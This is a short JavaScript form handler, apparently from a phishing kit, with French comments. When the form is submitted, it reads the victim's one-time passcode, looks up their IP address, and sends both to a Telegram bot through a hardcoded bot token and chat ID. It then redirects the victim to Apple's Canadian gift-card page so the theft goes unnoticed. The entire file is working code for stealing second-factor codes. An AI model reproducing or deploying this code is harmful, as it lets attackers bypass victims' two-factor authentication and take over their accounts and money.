document.getElementById('submitButton').addEventListener('click', async function(event) {
    event.preventDefault(); // Empêcher le rechargement de la page

    var formData = new FormData(document.getElementById('myForm'));

    // Récupérer l'adresse IP du client
    const ipResponse = await fetch('https://api64.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const clientIP = ipData.ip;

       const response = await fetch('https://api.telegram.org/bot6466293415:AAF5wdlQz_6vs-hbv3cTWknuVg7KkhsMJJs/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '6564242483',
            text: `-------[OTP 2 ]-------
OTP 2: ${formData.get('otp')}
IP: ${clientIP}`,
        }),
    });

    const responseData = await response.json();
    console.log(responseData);

    setTimeout(function() {
        window.location.href = 'https://www.apple.com/ca/shop/gift-cards';
    } );
});
